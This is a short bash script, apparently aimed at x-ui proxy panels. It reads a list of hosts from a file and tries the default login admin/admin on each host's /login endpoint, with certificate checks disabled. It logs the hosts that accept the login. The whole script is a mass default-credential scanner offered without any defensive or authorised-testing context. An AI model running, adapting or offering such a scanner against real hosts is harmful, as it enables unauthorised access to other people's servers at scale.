#! /bin/bash

# 路径
xui=xui.txt
DIR=./xui_check/

rm -rf ${DIR}/xui.log > /dev/null 2>&1
mkdir $DIR 2>&1

for i in $(sed -n "p" $xui) ;do
    res=$(curl --request POST --data 'username=admin&password=admin' --insecure --max-time 3 "${i}/login" )
    if [[ "$res" =~ .*true.* ]]; then
       echo $i >> ${DIR}/xui.log
    else
       echo "-" >> ${DIR}/xui.log
    fi
done
